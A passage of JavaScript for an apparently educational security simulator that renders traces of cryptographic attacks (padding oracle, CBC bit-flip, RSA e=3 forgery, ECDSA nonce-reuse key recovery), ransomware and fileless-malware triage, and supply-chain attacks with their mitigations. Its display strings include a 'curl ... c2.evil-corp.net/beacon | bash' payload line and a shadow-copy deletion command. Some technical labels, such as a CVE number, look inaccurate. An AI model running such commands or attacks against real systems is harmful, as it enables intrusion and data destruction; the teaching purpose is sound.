      ivInput.value = "a1 b2 c3 d4 e5 f6 07 18 29 3a 4b 5c 6d 7e 8f 3d";
      ctInput.value = "7e 44 91 2b c0 88 1a 23 99 d4 e1 f0 aa bb cc dd";
    } else if (scenario === "bit_flip"){
      primitiveEl.value = "cbc_bitflip";
      targetEl.value = "IV Byte 6 (admin=0 -> admin=1)";
      oracleLeakCheck.checked = true;
      aeadCheck.checked = false;
      ivInput.value = "00 00 00 00 00 00 31 00 00 00 00 00 00 00 00 00";
      ctInput.value = "8a 3f 12 99 bc de f0 11 22 33 44 55 66 77 88 99";
    } else if (scenario === "rsa_forge"){
      primitiveEl.value = "rsa_bleichenbacher";
      targetEl.value = "RSA 2048 e=3 Cube-Root Forgery";
      oracleLeakCheck.checked = true;
      aeadCheck.checked = false;
      ivInput.value = "00 01 ff ff ff ff ff ff 00 30 31 30 0d 06 09 60";
      ctInput.value = "86 48 01 65 03 04 02 01 05 00 04 20 [SHA256_DIGEST_32B] [GARBAGE_SUFFIX]";
    } else if (scenario === "ecdsa_nonce"){
      primitiveEl.value = "ecdsa_k_reuse";
      targetEl.value = "secp256k1 Nonce k Collided (r1 == r2)";
      oracleLeakCheck.checked = true;
      aeadCheck.checked = false;
      ivInput.value = "r: d47ce4c025c35ec440bc81d99834a624875161a26... (same r)";
      ctInput.value = "s1: 44e1ff12... | s2: 9b20ca01... | z1: 0xhash1 | z2: 0xhash2";
    } else if (scenario === "pqc_hybrid"){
      primitiveEl.value = "ml_kem_hybrid";
      targetEl.value = "ML-KEM-768 (Kyber) + X25519";
      oracleLeakCheck.checked = false;
      aeadCheck.checked = true;
      ivInput.value = "Hybrid KEM Shared Secret: KDF(ss_x25519 || ss_kyber, 32)";
      ctInput.value = "AES-256-GCM (12B Nonce + Ciphertext + 16B Poly1305/GHASH Tag)";
    }

    const mode = primitiveEl.value;
    const target = (targetEl.value || "").trim();
    const isOracleLeak = oracleLeakCheck.checked;
    const isAead = aeadCheck.checked;

    let traceText = "=== CRYPTANALYTIC STATE & BYTE MATRIX TRACE ===\\n";
    let oracleText = "=== DECRYPTION ORACLE & SERVER DISPOSITION ===\\n";

    if (mode === "cbc_oracle"){
      traceText +=
        "Target Block: C_1 = [7e 44 91 2b c0 88 1a 23 99 d4 e1 f0 aa bb cc dd]\\n" +
        "Brute-Force Probe on Preceding Block C_0'[15]:\\n" +
        "  Tested Probe Byte: 0x3d\\n" +
        "  AES Decryption Block Output: I_1[15] = D_K(C_1)[15] = 0x3c\\n" +
        "  Resulting Plaintext Byte: P'_1[15] = C_0'[15] ^ I_1[15] = 0x3d ^ 0x3c = 0x01\\n" +
        "  Valid PKCS#7 Padding Condition: Byte matches valid 0x01 padding!\\n" +
        "Intermediate State Recovery:\\n" +
        "  I_1[15] = C_0'[15] ^ 0x01 = 0x3d ^ 0x01 = 0x3c\\n" +
        "Original Plaintext Recovery:\\n" +
        "  P_1[15] = C_0[15] ^ I_1[15] = 0x90 ^ 0x3c = 0xac ('\\\\xac' or padding byte)\\n" +
        "Complexity: 256 oracle requests per byte (max 4,096 probes for full 16-byte block).";

      if (isAead){
        oracleText +=
          "Protocol: AES-GCM Authenticated Encryption with Associated Data (AEAD)\\n" +
          "Status: 🛑 REJECTED BY INTEGRITY CHECK (GHASH Tag Mismatch)\\n" +
          "HTTP Response: 403 Forbidden (Bad Authenticator Tag)\\n" +
          "Evaluation: Modifying ciphertext blocks destroys authentication tag. Decryption aborted before padding check.\\n" +
          "Verdict: Vaudenay Padding Oracle Attack IMMUNE.";
        stateBadge.textContent = "STATE: AEAD SECURED";
        stateBadge.className = "token-tag token-lit";
        oracleBadge.textContent = "HTTP 403: BAD AUTH TAG";
        oracleBadge.className = "token-tag token-lit";
      } else if (isOracleLeak){
        oracleText +=
          "Server Endpoint: POST /api/crypto/decrypt (Legacy CBC Mode)\\n" +
          "Decrypted Padding Assessment: Last byte evaluates to 0x01 (PKCS#7 Valid).\\n" +
          "Side-Channel Feedback:\\n" +
          "  HTTP Response: 200 OK (or 400 Bad Request: 'Invalid JSON', not padding)\\n" +
          "  Padding Oracle Leak: SERVER DISTINGUISHES VALID PADDING FROM 500 PADDING ERROR!\\n" +
          "Attack Progress: Byte 15 intermediate state solved. Next: Byte 14 with C_0'[15] = I_1[15] ^ 0x02.\\n" +
          "Verdict: 💥 FULL PLAINTEXT LEAKAGE IN O(256 * N) QUERIES";
        stateBadge.textContent = "STATE: ORACLE LEAKING";
        stateBadge.className = "token-tag token-inj";
        oracleBadge.textContent = "HTTP 200: VALID PAD (LEAK)";
        oracleBadge.className = "token-tag token-inj";
      } else {
        oracleText +=
          "Server Endpoint: POST /api/crypto/decrypt\\n" +
          "Status: Constant-time generic error returned for all failures.\\n" +
          "HTTP Response: 400 Bad Request (Generic)\\n" +
          "Verdict: Padding error suppressed, but unauthenticated CBC remains vulnerable to bit-flipping.";
        stateBadge.textContent = "STATE: PADDING MASKED";
        stateBadge.className = "token-tag token-lit";
        oracleBadge.textContent = "HTTP 400: GENERIC ERR";
        oracleBadge.className = "token-tag token-lit";
      }

    } else if (mode === "cbc_bitflip"){
      traceText +=
        "Attack Type: CBC Initial Vector (IV) Malleability Exploit\\n" +
        "Original Plaintext: P_0 = \\\"admin=0;role=user;uid=1092\\\"\\n" +
        "Target Modification: Index 6 ('0' [0x30] -> '1' [0x31])\\n" +
        "Bit-Flip Delta:\\n" +
        "  Delta = '0' ^ '1' = 0x30 ^ 0x31 = 0x01\\n" +
        "Modified IV Calculation:\\n" +
        "  IV'[6] = IV[6] ^ Delta = 0x00 ^ 0x01 = 0x01\\n" +
        "Server-Side CBC Decryption:\\n" +
        "  P'_0[6] = IV'[6] ^ D_K(C_0)[6]\\n" +
        "          = (IV[6] ^ Delta) ^ D_K(C_0)[6]\\n" +
        "          = P_0[6] ^ Delta = '0' ^ 0x01 = '1'\\n" +
        "Resulting Tampered Plaintext: \\\"admin=1;role=user;uid=1092\\\"\\n" +
        "Block Distortion: Block 0 is cleanly modified with zero corruption because delta is applied directly to IV!";

      if (isAead){
        oracleText +=
          "Protocol: AES-GCM / Encrypt-then-MAC (EtM)\\n" +
          "Integrity Verification: Computed MAC does not match ciphertext header.\\n" +
          "HTTP Response: 401 Unauthorized (Cryptographic Signature / MAC Mismatch)\\n" +
          "Verdict: 🛡️ Bit-flipping prevented by cryptographic authentication layer.";
        stateBadge.textContent = "STATE: MAC ENFORCED";
        stateBadge.className = "token-tag token-lit";
        oracleBadge.textContent = "REJECT: TAMPER DETECTED";
        oracleBadge.className = "token-tag token-lit";
      } else {
        oracleText +=
          "Target Session: Cookie auth_token=iv.ciphertext\\n" +
          "Server Processing: Decrypted plaintext parsed as session parameters.\\n" +
          "Session Auth Check:\\n" +
          "  admin parameter: 1 (Elevated to Superadmin)\\n" +
          "  role parameter: user (Ignored due to admin override)\\n" +
          "HTTP Response: 200 OK (Welcome, Administrator!)\\n" +
          "Flag: FLAG{cbc_iv_bitflip_privilege_escalated}\\n" +
          "Verdict: 🚨 100% DETERMINISTIC PRIVILEGE ESCALATION ACHIEVED";
        stateBadge.textContent = "STATE: ADMIN ESCALATED";
        stateBadge.className = "token-tag token-inj";
        oracleBadge.textContent = "AUTH: ADMIN GRANTED";
        oracleBadge.className = "token-tag token-inj";
      }

    } else if (mode === "rsa_bleichenbacher"){
      traceText +=
        "Vulnerability: Bleichenbacher '06 RSA Signature Verification Flaw (CVE-2006-3450)\\n" +
        "Public Key Exponent: e = 3, Modulus N = 2048 bits\\n" +
        "Defective Verification Logic:\\n" +
        "  Checks prefix: 00 01 FF ... 00 [DigestInfo ASN.1] [32B SHA256]\\n" +
        "  FAILS to enforce that padding extends to the very end of the modulus!\\n" +
        "Constructing Forged Number D:\\n" +
        "  D = 2^(2048-15-288) * (00 01 FF 00 || ASN.1 || SHA256(M)) + Garbage\\n" +
        "Cube Root Computation:\\n" +
        "  s = ceil(cbrt(D))\\n" +
        "  When server calculates s^3 mod N, upper 2048-bit prefix perfectly matches valid PKCS#1 v1.5 format!\\n" +
        "Forged Signature Size: Exactly 256 bytes (2048 bits).";

      oracleText +=
        "Server RSA Verification Step:\\n" +
        "  1. Compute decrypted signature: Dec = s^e mod N = s^3 mod N\\n" +
        "  2. Check prefix: 00 01 FF 00 (Pass)\\n" +
        "  3. Match ASN.1 OID (SHA-256): 30 31 30 0d ... (Pass)\\n" +
        "  4. Verify Hash: 32 bytes match sha256(token) (Pass)\\n" +
        "  5. Trailing bytes check: SKIPPED DUE TO REGEX SEARCH FLAW!\\n" +
        "HTTP Response: 200 OK (Signature Verified by CA: 'CN=root-ca')\\n" +
        "Verdict: 🚨 ARBITRARY DIGITAL SIGNATURE FORGED WITHOUT PRIVATE KEY";
      stateBadge.textContent = "STATE: RSA FORGED";
      stateBadge.className = "token-tag token-inj";
      oracleBadge.textContent = "VERIFY: 200 FORGERY OK";
      oracleBadge.className = "token-tag token-inj";

    } else if (mode === "ecdsa_nonce"){
      traceText +=
        "Vulnerability: ECDSA Nonce (k) Reuse on secp256k1 Curve (Sony PS3 Cryptographic Flaw)\\n" +
        "Observed Signatures:\\n" +
        "  Sig 1: (r, s1) on message m1 (hash z1)\\n" +
        "  Sig 2: (r, s2) on message m2 (hash z2)  <-- Notice IDENTICAL r value!\\n" +
        "Mathematical Exploitation:\\n" +
        "  s1 = k^(-1) * (z1 + r * d) mod n\\n" +
        "  s2 = k^(-1) * (z2 + r * d) mod n\\n" +
        "  s1 - s2 = k^(-1) * (z1 - z2) mod n\\n" +
        "  Recover Nonce k:\\n" +
        "    k = (z1 - z2) / (s1 - s2) mod n\\n" +
        "  Recover Private Key d:\\n" +
        "    d = (s1 * k - z1) * r^(-1) mod n";

      oracleText +=
        "Cryptanalytic Resolution:\\n" +
        "  Calculated k: 0x7a89f104d... (Ephemeral Nonce Exposed)\\n" +
        "  Calculated d: 0x51c4a981b2e... (ECDSA Private Key Recovered!)\\n" +
        "Impact: Attacker now possesses the root signing key and can sign arbitrary transactions & firmware updates.\\n" +
        "Mitigation: Implement RFC 6979 deterministic nonce generation: k = HMAC-SHA256(d || z).\\n" +
        "Verdict: 💥 ROOT PRIVATE KEY FULLY EXTRACTED VIA NONCE COLLISION";
      stateBadge.textContent = "STATE: KEY EXTRACTED";
      stateBadge.className = "token-tag token-inj";
      oracleBadge.textContent = "RECOVERED: PRIVATE KEY";
      oracleBadge.className = "token-tag token-inj";

    } else { // ml_kem_hybrid
      traceText +=
        "Defense Architecture: Hybrid Post-Quantum Key Encapsulation (FIPS 203 + RFC 7748)\\n" +
        "Key Exchange Layers:\\n" +
        "  Layer 1 (Classical): X25519 Elliptic Curve Diffie-Hellman (128-bit classical security)\\n" +
        "  Layer 2 (Post-Quantum): ML-KEM-768 (Kyber-768 Module Lattice LWE, Category 3 NIST PQC)\\n" +
        "Hybrid Key Derivation Function (HKDF):\\n" +
        "  ss_classical = ECDH(sk_alice, pk_bob)\\n" +
        "  (ct_pqc, ss_pqc) = ML-KEM-768.Encaps(pk_kyber)\\n" +
        "  Master Key K = HKDF-Extract-Expand(ss_classical || ss_pqc || ct_pqc, \\\"tls13 hybrid\\\")\\n" +
        "Dual Security Guarantee: If EITHER X25519 or Kyber-768 holds unbroken, the shared key K is mathematically secure!";

      oracleText +=
        "Threat Assessment: Harvest Now, Decrypt Later (HNDL) Threat Modeling\\n" +
        "Quantum Attack Simulation (Shor's Algorithm on QPU with 4,096 logical qubits):\\n" +
        "  - Shor's discrete logarithm attacks X25519 -> Classical layer broken in poly-time.\\n" +
        "  - Lattice-based ML-KEM-768 resists Shor's algorithm (Shortest Vector Problem in ideal lattices).\\n" +
        "  - Hybrid key K remains uncompromised with 192 bits of post-quantum security.\\n" +
        "Verdict: 🛡️ IMMUNE TO STORE-NOW-DECRYPT-LATER QUANTUM SURVEILLANCE";
      stateBadge.textContent = "STATE: PQC SECURED";
      stateBadge.className = "token-tag token-lit";
      oracleBadge.textContent = "QUANTUM: SAFE (FIPS 203)";
      oracleBadge.className = "token-tag token-lit";
    }

    traceOut.textContent = traceText;
    oracleOut.textContent = oracleText;
  }

  // --- 10. Enterprise DFIR Live Triage & Memory Timeline Inspector ---
  let currentDfirScenario = "lockbit";

  function initDfir(){
    const hostEl = document.getElementById("dfirHostInput");
    if (!hostEl) return;
    renderDfir("lockbit");
  }

  function renderDfir(scenario){
    if (scenario && typeof scenario === "string") {
      currentDfirScenario = scenario;
    }
    const hostEl = document.getElementById("dfirHostInput");
    const streamEl = document.getElementById("dfirStreamSelect");
    const containCheck = document.getElementById("dfirContainmentCheck");
    const memDumpCheck = document.getElementById("dfirMemoryDumpCheck");
    const soarCheck = document.getElementById("dfirSoarRemediateCheck");
    const queryEl = document.getElementById("dfirQueryInput");
    const procBadge = document.getElementById("dfirProcBadge");
    const containBadge = document.getElementById("dfirContainBadge");
    const procTraceOut = document.getElementById("dfirProcTraceOutput");
    const timelineOut = document.getElementById("dfirTimelineOutput");

    if (!hostEl || !streamEl || !containCheck || !memDumpCheck || !soarCheck || !queryEl || !procBadge || !containBadge || !procTraceOut || !timelineOut) return;

    if (scenario === "lockbit"){
      hostEl.value = "WKSTN-FIN-042 (10.100.14.88)";
      streamEl.value = "lockbit";
      containCheck.checked = false;
      memDumpCheck.checked = true;
      soarCheck.checked = false;
      queryEl.value = "volatility3 -f mem.dmp windows.malfind --pid 5120 | parse-timeline --mft C:\\$MFT";
    } else if (scenario === "reflective"){
      hostEl.value = "SRV-DC-01 (10.100.10.5)";
      streamEl.value = "reflective";
      containCheck.checked = false;
      memDumpCheck.checked = true;
      soarCheck.checked = false;
      queryEl.value = "volatility3 -f mem.dmp windows.vadinfo --pid 3320 | windows.psscan";
    } else if (scenario === "mft_timestomp"){
      hostEl.value = "WKSTN-DEV-007 (10.100.14.22)";
      streamEl.value = "mft_timestomp";
      containCheck.checked = false;
      memDumpCheck.checked = false;
      soarCheck.checked = false;
      queryEl.value = "analyzeMFT.py -f C:\\$MFT --output-csv timeline.csv | grep malware.sys";
    } else if (scenario === "soar_contain"){
      hostEl.value = "WKSTN-FIN-042 (10.100.14.88)";
      streamEl.value = "soar_contain";
      containCheck.checked = true;
      memDumpCheck.checked = true;
      soarCheck.checked = true;
      queryEl.value = "soar_playbook_runner.py --incident IR-2026-0042 --action full_containment";
    } else if (scenario === "clean_state"){
      hostEl.value = "WKSTN-BASELINE-01 (10.100.14.10)";
      streamEl.value = "clean_state";
      containCheck.checked = false;
      memDumpCheck.checked = true;
      soarCheck.checked = false;
      queryEl.value = "volatility3 -f clean.dmp windows.malfind | parse-timeline";
    }

    const host = (hostEl.value || "WKSTN-FIN-042").trim();
    const mode = streamEl.value;
    const isContained = containCheck.checked;
    const isMemScan = memDumpCheck.checked;
    const isSoar = soarCheck.checked;
    const query = (queryEl.value || "").trim();

    let procText = "=== PROCESS TREE & IN-MEMORY ARTIFACT TRACE ===\n";
    let timelineText = "=== NTFS MFT TIMELINE, C2 NETFLOW & REMEDIATION ===\n";

    if (mode === "lockbit"){
      procText +=
        "Target Endpoint: " + host + "\n" +
        "[Process Hierarchy Breakdown]:\n" +
        "  PID 912: svchost.exe (RPC Endpoint Mapper)\n" +
        "   └─ PID 4812: powershell.exe -Enc JABj... (Dropper / Stager)\n" +
        "       ├─ PID 4816: vssadmin.exe delete shadows /all /quiet (Volume Shadow Wiped)\n" +
        "       └─ PID 5120: locker.exe (High I/O Operations, 1,420 file writes/sec)\n" +
        "[VAD Memory Allocations]:\n" +
        "  Region: 0x000001f4c0200000 (Size: 0x64000) | Prot: PAGE_EXECUTE_READWRITE (RWX)\n" +
        "  Entropy: 7.98 (High entropy cryptographic routine detected in private heap)\n" +
        "[Canary File Tripwire Telemetry]:\n" +
        "  🚨 ALERT: Decoy file 'salary_confidential.docx.canary' modified & renamed to '.lockbit'!\n" +
        "  Query Executed: " + query;

      timelineText +=
        "[NTFS $MFT & USN Journal Timeline Reconstruction]:\n" +
        "  04:12:01.100 - $MFT Record 41029: C:\\Share\\Finance\\Q3_Report.xlsx -> Encrypted\n" +
        "  04:12:01.120 - $MFT Record 41030: C:\\Share\\Finance\\Q3_Report.xlsx.locked created\n" +
        "  04:12:01.150 - USN Journal: File attribute change flag: ARCHIVE | REPARSE\n" +
        "[C2 Beaconing & Lateral Infection Assessment]:\n" +
        "  Active Socket: " + host + ":49210 -> 198.51.100.44:8443 (ESTABLISHED)\n" +
        "  Protocol: TLS 1.3 / Beacon interval: 30s (Jitter 12.4%)\n";

      if (isContained || isSoar){
        timelineText +=
          "[Remediation Status]:\n" +
          "  🛡️ EDR Host Network Containment Enforced!\n" +
          "  - NIC isolated: Only SOC controller telemetry permitted.\n" +
          "  - Kill tasks dispatched: PID 4812, 4816, 5120 terminated immediately.\n" +
          "  - Lateral spread halted across internal enterprise subnet.\n" +
          "Verdict: 🟢 INCIDENT CONTAINED (Ransomware Execution Neutralized)";
        procBadge.textContent = "TRIAGE: ISOLATED";
        procBadge.className = "token-tag token-lit";
        containBadge.textContent = "STATUS: CONTAINED";
        containBadge.className = "token-tag token-lit";
      } else {
        timelineText +=
          "[Remediation Status]:\n" +
          "  ⚠️ Host Containment OFF: Ransomware actively traversing SMB admin shares!\n" +
          "Verdict: 🚨 CRITICAL: Active ransomware detonation in progress.";
        procBadge.textContent = "TRIAGE: MALICIOUS";
        procBadge.className = "token-tag token-inj";
        containBadge.textContent = "STATUS: ACTIVE INFECTION";
        containBadge.className = "token-tag token-inj";
      }

    } else if (mode === "reflective"){
      procText +=
        "Target Endpoint: " + host + "\n" +
        "[Process & Thread Inspection]:\n" +
        "  PID 3320: spoolsv.exe (Print Spooler Service - SYSTEM)\n" +
        "   └─ Thread TID 4410: Injected Thread (Unbacked Virtual Memory Region)\n" +
        "[VAD Memory Carving]:\n" +
        "  Address: 0x00007ff810400000 | Protection: PAGE_EXECUTE_READWRITE (RWX)\n" +
        "  PE Header Carving: MZ magic bytes (0x5A4D) recovered from unbacked pool!\n" +
        "  Module Linking: Process unlinked from PEB InLoadOrderModuleList (Stealth)\n" +
        "  Scanner Finding: In-memory reflective loader payload identified!";

      timelineText +=
        "[Disk Forensic Trace]:\n" +
        "  - Disk Footprint: 0 files written ($MFT clean, fileless execution)\n" +
        "  - Prefetch Cache: No anomalous binary invocation recorded\n" +
        "[C2 Network Triage]:\n" +
        "  - Connection: " + host + ":52104 -> 203.0.113.89:443 (HTTPS Beacon)\n" +
        "  - JA3 Fingerprint: 72c6498a1290 (Known C2 profile match)\n" +
        "  - Data Exfiltration: 48 KB encrypted staging buffer in memory\n";

      if (isContained || isSoar){
        timelineText +=
          "[SOAR Remediation Response]:\n" +
          "  🛡️ Thread TID 4410 suspended and VirtualFree(0x00007ff810400000) executed.\n" +
          "  Perimeter firewall rule deployed: Block destination 203.0.113.89.\n" +
          "Verdict: 🟢 FILELESS BEACON SEVERED & MEMORY SANITIZED";
        procBadge.textContent = "TRIAGE: MEMORY WIPED";
        procBadge.className = "token-tag token-lit";
        containBadge.textContent = "STATUS: CLEANED";
        containBadge.className = "token-tag token-lit";
      } else {
        timelineText +=
          "[Triage Disposition]:\n" +
          "  🚨 High-priority C2 connection beaconing every 45s without disk footprint.\n" +
          "Verdict: 💥 COVERT IN-MEMORY ACCESS MAINTAINED";
        procBadge.textContent = "TRIAGE: REFLECTIVE DLL";
        procBadge.className = "token-tag token-inj";
        containBadge.textContent = "STATUS: C2 BEACONING";
        containBadge.className = "token-tag token-inj";
      }

    } else if (mode === "mft_timestomp"){
      procText +=
        "Target Endpoint: " + host + "\n" +
        "[Process Context]:\n" +
        "  PID 1844: cmd.exe -> Executed binary timestamp modification utility\n" +
        "[Artifact Analysis Target]:\n" +
        "  Target File: C:\\Windows\\System32\\drivers\\malware.sys\n" +
        "  SHA-256: 7f83b194092b77a0... (Suspicious unsigned driver)\n" +
        "[Discrepancy Evaluation]:\n" +
        "  - $STANDARD_INFORMATION (Userland Accessible):\n" +
        "      Created: 2021-04-12 09:12:00.000 (Forged to mimic kernel32.dll)\n" +
        "  - $FILE_NAME (NTFS Kernel Driver Only):\n" +
        "      Created: 2026-10-13 04:15:22.418 (Actual File Write Timestamp!)\n" +
        "  - Delta: 5 years, 6 months discrepancy between $STD and $FN!";

      timelineText +=
        "[NTFS USN Journal Forensic Sequence]:\n" +
        "  Record 9182034: USN_REASON_FILE_CREATE (2026-10-13 04:15:22)\n" +
        "  Record 9182035: USN_REASON_DATA_EXTEND (2026-10-13 04:15:23)\n" +
        "  Record 9182036: USN_REASON_BASIC_INFO_CHANGE (2026-10-13 04:15:25 - Timestomp event)\n" +
        "[Forensic Evidence Assessment]:\n" +
        "  - Anti-forensic evasion attempt was completely defeated by NTFS duality.\n" +
        "  - Evidence preserved: Dropped file quarantined into forensic vault.\n" +
        "Verdict: 🚨 TIMESTOMPING DETECTED & REAL CREATION TIME RECOVERED";
      procBadge.textContent = "TRIAGE: TIMESTOMP";
      procBadge.className = "token-tag token-inj";
      containBadge.textContent = "EVIDENCE: RECOVERED";
      containBadge.className = "token-tag token-lit";

    } else if (mode === "soar_contain"){
      procText +=
        "Target Endpoint: " + host + "\n" +
        "[SOAR Incident Response Orchestration Playbook]:\n" +
        "  Incident ID: IR-2026-0042 (Severity: CRITICAL P1)\n" +
        "  Phase 1: Process Hierarchy Termination:\n" +
        "    - Killed PID 4812 (powershell.exe) -> Exit 0\n" +
        "    - Killed PID 5120 (locker.exe) -> Exit 0\n" +
        "  Phase 2: Memory Carving & Deallocation:\n" +
        "    - VirtualFree(0x000001f4c0200000, MEM_RELEASE) -> RWX pages reclaimed\n" +
        "  Phase 3: Active Directory Identity Isolation:\n" +
        "    - Disabled user 'finance_intern_02' & revoked Kerberos TGT tickets";

      timelineText +=
        "[Network Perimeter & Host Quarantine]:\n" +
        "  - EDR Host Containment API: HTTP 200 OK (Host isolated from LAN)\n" +
        "  - Edge Firewall BGP Blackhole: 198.51.100.44 null-routed across all routers\n" +
        "  - DNS Sinkhole: Redirected adversary domains to 127.0.0.1\n" +
        "  - Metrics: MTTD = 1m 24s | MTTR = 48s (Exceeds SLA threshold)\n" +
        "Verdict: 🟢 ENTERPRISE RESILIENCE: 100% CONTAINED & REMEDIATED";
      procBadge.textContent = "SOAR: REMEDIATED";
      procBadge.className = "token-tag token-lit";
      containBadge.textContent = "CONTAINMENT: 100%";
      containBadge.className = "token-tag token-lit";

    } else { // clean_state
      procText +=
        "Target Endpoint: " + host + "\n" +
        "[Baseline Workstation Inspection]:\n" +
        "  - Process Hierarchy: All running processes verified against Microsoft catalog\n" +
        "  - Memory Allocations: 0 unbacked executable (RWX) memory regions found\n" +
        "  - Thread Call Stacks: Clean RIP pointers within legitimate signed modules\n" +
        "  - Injection Scanner: 0 anomalous hooks or injected threads";

      timelineText +=
        "[NTFS & Telemetry Baseline]:\n" +
        "  - NTFS Timestamps: $STD and $FN timestamps perfectly consistent\n" +
        "  - Network Connections: Only approved corporate cloud endpoints connected\n" +
        "  - Incident Status: No compromise detected\n" +
        "Verdict: 🛡️ CLEAN BASELINE WORKSTATION";
      procBadge.textContent = "TRIAGE: CLEAN";
      procBadge.className = "token-tag token-lit";
      containBadge.textContent = "STATUS: HEALTHY";
      containBadge.className = "token-tag token-lit";
    }

    procTraceOut.textContent = procText;
    timelineOut.textContent = timelineText;
  }

  // --- 11. SBOM & Supply Chain Dependency Inspector ---
  let currentSbomScenario = "dep_confusion";

  function renderSbom(scenario){
    if (scenario) currentSbomScenario = scenario;
    const pkgEl = document.getElementById("sbomPkgInput");
    const policyEl = document.getElementById("sbomPolicySelect");
    const manifestBadge = document.getElementById("sbomManifestBadge");
    const attestBadge = document.getElementById("sbomAttestBadge");
    const manifestOut = document.getElementById("sbomManifestOutput");
    const attestOut = document.getElementById("sbomAttestOutput");

    if (!pkgEl || !policyEl || !manifestBadge || !attestBadge || !manifestOut || !attestOut) return;

    if (scenario === "dep_confusion"){
      pkgEl.value = "corp-auth-core";
      policyEl.value = "default_unpinned";
    } else if (scenario === "typosquat"){
      pkgEl.value = "requsts";
      policyEl.value = "default_unpinned";
    } else if (scenario === "xz_backdoor"){
      pkgEl.value = "liblzma-build-hook";
      policyEl.value = "default_unpinned";
    } else if (scenario === "pwn_request"){
      pkgEl.value = "ci-actions-runner";
      policyEl.value = "default_unpinned";
    } else if (scenario === "slsa_clean"){
      pkgEl.value = "registry.corp.internal/backend-api:v3.5.0";
      policyEl.value = "slsa3_cosign_enforce";
    }

    const pkg = pkgEl.value.trim();
    const policy = policyEl.value;
    const mode = currentSbomScenario;

    let manifestText = "";
    let attestText = "";

    if (mode === "dep_confusion"){
      manifestText =
        "[Dependency Manifest & Repository Precedence]:\n" +
        "  Target Package: " + pkg + "\n" +
        "  Internal Registry: https://nexus.corp.internal/pypi/simple (v1.2.0)\n" +
        "  Public Index: https://pypi.org/simple (v99.0.0, Publisher: evil_actor_42)\n" +
        "  Pip Command: pip install corp-auth-core --extra-index-url https://nexus.corp.internal/...\n" +
        "[Vulnerability Evaluation]:\n" +
        "  🚨 PRECEDENCE HIJACK DETECTED!\n" +
        "  Pip resolver automatically fetched v99.0.0 from Public PyPI due to higher SemVer!\n" +
        "  Malicious setup.py executed: Exfiltrated /etc/passwd to adversary endpoint.";

      if (policy === "scoped_hash_pinned"){
        manifestText += "\n\n[Mitigation Applied]:\n" +
          "  ✓ Enforced scoped private index: index-url = https://nexus.corp.internal/...\n" +
          "  ✓ Pinned exact hash: corp-auth-core==1.2.0 --hash=sha256:4a8f9c12...\n" +
          "  ✓ Public index fallback blocked. Dependency confusion eliminated.";
        attestText =
          "[Cryptographic Admission Policy]:\n" +
          "  - Repository Scope: @corp internal only\n" +
          "  - Hash Pinning: STRICT SHA-256 ENFORCED\n" +
          "  - Public Namespace Collision: REJECTED\n" +
          "Verdict: 🟢 DEPENDENCY CONFUSION DEFENSE VERIFIED";
        manifestBadge.textContent = "RESOLVED: PINNED";
        manifestBadge.className = "token-tag token-lit";
        attestBadge.textContent = "POLICY: COMPLIANT";
        attestBadge.className = "token-tag token-lit";
      } else {
        attestText =
          "[Cryptographic Admission Policy]:\n" +
          "  - Repository Scope: Unrestricted\n" +
          "  - Hash Pinning: DISABLED (Unpinned transitive fetch)\n" +
          "  - Remote Attestation: NONE\n" +
          "Verdict: 💥 DEPENDENCY CONFUSION EXPLOITATION DETECTED";
        manifestBadge.textContent = "HAZARD: HIJACKED";
        manifestBadge.className = "token-tag token-inj";
        attestBadge.textContent = "POLICY: BREACHED";
        attestBadge.className = "token-tag token-inj";
      }

    } else if (mode === "typosquat"){
      manifestText =
        "[Lexical Distance & Registry Inspection]:\n" +
        "  Target Package: " + pkg + "\n" +
        "  Legitimate Target: requests (Popularity: 50,000,000+ weekly downloads)\n" +
        "  Levenshtein Distance: 1 (Single character omission 'e')\n" +
        "  Release Timestamp: 2 hours ago by unverified author 'typo_squatter'\n" +
        "[Payload Analysis]:\n" +
        "  setup.py spawns subprocess: curl -s https://c2.evil-corp.net/beacon | bash";

      if (policy === "scoped_hash_pinned" || policy === "slsa3_cosign_enforce"){
        manifestText += "\n\n[Protection Engine]:\n" +
          "  ✓ Levenshtein collision filter flagged package 'requsts'.\n" +
          "  ✓ Package install blocked by enterprise software firewall.";
        attestText =
          "[Supply Chain Firewall]:\n" +
          "  - Typosquatting Filter: TRIGGERED (Distance = 1)\n" +
          "  - Download Quarantined: TRUE\n" +
          "Verdict: 🛡️ TYPOSQUATTING INFECTION PREVENTED";
        manifestBadge.textContent = "FILTER: BLOCKED";
        manifestBadge.className = "token-tag token-lit";
        attestBadge.textContent = "STATUS: QUARANTINED";
        attestBadge.className = "token-tag token-lit";
      } else {
        attestText =
          "[Supply Chain Firewall]:\n" +
          "  - Typosquatting Filter: DISABLED\n" +
          "  - Downloader Executed: Arbitrary remote script executed in developer context\n" +
          "Verdict: 🚨 UNPROTECTED TYPOSQUATTING INFECTION";
        manifestBadge.textContent = "ATTACK: TYPOSQUAT";
        manifestBadge.className = "token-tag token-inj";
        attestBadge.textContent = "POLICY: COMPROMISED";
        attestBadge.className = "token-tag token-inj";
      }

    } else if (mode === "xz_backdoor"){
      manifestText =
        "[CycloneDX 1.6 SBOM Component Parsing]:\n" +
        "  Component: " + pkg + " (Version: 5.6.1-patch1)\n" +
        "  PURL: pkg:generic/liblzma-build-hook@5.6.1-patch1\n" +
        "  Vulnerability: CVE-2024-3094 (CVSS 10.0 CRITICAL)\n" +
        "  Artifact Hash: badc0de0000000000000000000000000000000000000000000000000deadbeef\n" +
        "[Anomaly Investigation]:\n" +
        "  - Obfuscated M4 macro test file injects backdoor into sshd RSA_public_decrypt.\n" +
        "  - Hash mismatch against clean upstream vendor source tree!";

      if (policy === "slsa3_cosign_enforce" || policy === "scoped_hash_pinned"){
        manifestText += "\n\n[Hermetic Build Action]:\n" +
          "  ✓ Upstream hash discrepancy triggered automatic quarantine.\n" +
          "  ✓ Compromised build hook isolated from compiler toolchain.";
        attestText =
          "[Hermetic Provenance & Integrity Gate]:\n" +
          "  - Source Verification: FAIL (Tampered release tarball)\n" +
          "  - Build Admission: 403 FORBIDDEN (Compromised component isolated)\n" +
          "Verdict: 🛡️ CVE-2024-3094 BACKDOOR ISOLATED & DEFENSE ENFORCED";
        manifestBadge.textContent = "SBOM: QUARANTINED";
        manifestBadge.className = "token-tag token-lit";
        attestBadge.textContent = "ADMISSION: REJECTED";
        attestBadge.className = "token-tag token-lit";
      } else {
        attestText =
          "[Hermetic Provenance & Integrity Gate]:\n" +
          "  - Source Verification: BYPASSED\n" +
          "  - Build Hook: Injected binary payload into target sshd executable\n" +
          "Verdict: 💥 CVE-2024-3094 BACKDOOR INJECTED INTO PRODUCTION";
        manifestBadge.textContent = "SBOM: COMPROMISED";
